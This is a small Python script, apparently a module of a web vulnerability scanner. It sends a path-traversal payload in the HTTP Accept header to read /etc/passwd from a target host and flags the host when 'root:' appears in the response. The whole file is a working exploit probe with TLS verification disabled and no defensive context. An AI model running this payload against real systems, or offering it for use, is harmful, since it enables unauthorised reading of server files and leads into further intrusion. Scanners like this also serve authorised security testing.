#!/usr/bin/env python3
from requests import get
from urllib.parse import urlparse
from core import good
import sys


def scan(host):
    try:
        payloads = {
                'Accept ../../../../../../../../../../etc/passwd{{':'root:'
        }
        for payload,msg in payloads.items():
            r = get(host,headers={payload.split(' ')[0]:payload.split(' ')[1]},verify=False,allow_redirects=False)
            if r != 0:
                try:
                    if msg.encode() in r.content:
                        print(f"""{good} Found :> {host} | {payload.split(' ')[0]+": "+payload.split(' ')[1]}""")
                finally:
                    pass
    finally:
        pass


def main(opts):
    scan(opts)
